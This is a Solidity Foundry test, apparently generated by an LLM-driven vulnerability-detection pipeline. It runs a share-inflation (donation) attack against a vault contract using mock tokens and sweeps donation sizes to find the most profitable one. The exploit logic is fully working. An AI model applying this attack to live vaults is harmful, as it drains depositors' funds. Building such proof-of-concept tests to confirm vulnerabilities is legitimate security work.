// SPDX-License-Identifier: MIT
// AUTO-GENERATO dallo Stage-3 LLM-orchestratore (sub-agent) da targets/UnseenVulnVault.sol. L'LLM ha riempito SOLO
// import+deploy; l'attacco e' il template parametrico FISSO (fedele). L'exec-gate forge DISPONE (FP=0).
pragma solidity ^0.8.20;
import "forge-std/Test.sol";
import {ERC20} from "solmate/tokens/ERC20.sol";
import {MockToken} from "../src/Targets.sol";
import {UnseenVulnVault} from "../targets/UnseenVulnVault.sol";
contract Stage3_UnseenVulnVault is Test {
    address atk = address(0xA11CE); address vic = address(0xB0B);
    function _oneAttack(UnseenVulnVault v, MockToken t, uint256 V, uint256 D) internal returns (int256 profit, bool blocked) {
        t.mint(atk, 1 + D); t.mint(vic, V);
        vm.startPrank(atk); t.approve(address(v), type(uint256).max);
        try v.deposit(1, atk) returns (uint256) {} catch { vm.stopPrank(); return (int256(0), true); }
        t.transfer(address(v), D); vm.stopPrank();
        vm.startPrank(vic); t.approve(address(v), type(uint256).max);
        try v.deposit(V, vic) returns (uint256) { vm.stopPrank(); } catch { vm.stopPrank(); return (int256(0), true); }
        vm.startPrank(atk); uint256 got = v.redeem(v.balanceOf(atk), atk, atk); vm.stopPrank();
        return (int256(got) - int256(1 + D), false);
    }
    function testStage3() public {
        uint256 V = 100e18;
        uint256[12] memory Ds = [uint256(1e18),10e18,25e18,40e18,49e18,50e18,51e18,60e18,75e18,90e18,99e18,100e18];
        int256 maxP = type(int256).min; uint256 bestD;
        for (uint256 i=0;i<12;i++){ MockToken t = new MockToken(); UnseenVulnVault v = new UnseenVulnVault(ERC20(address(t)));
            (int256 p, bool b) = _oneAttack(v, t, V, Ds[i]); if (b) continue; if (p > maxP){ maxP = p; bestD = Ds[i]; } }
        emit log_string(string.concat("RESULT unseen_vuln_inflation maxProfit=", vm.toString(maxP), " witness=", vm.toString(bestD)));
    }
}
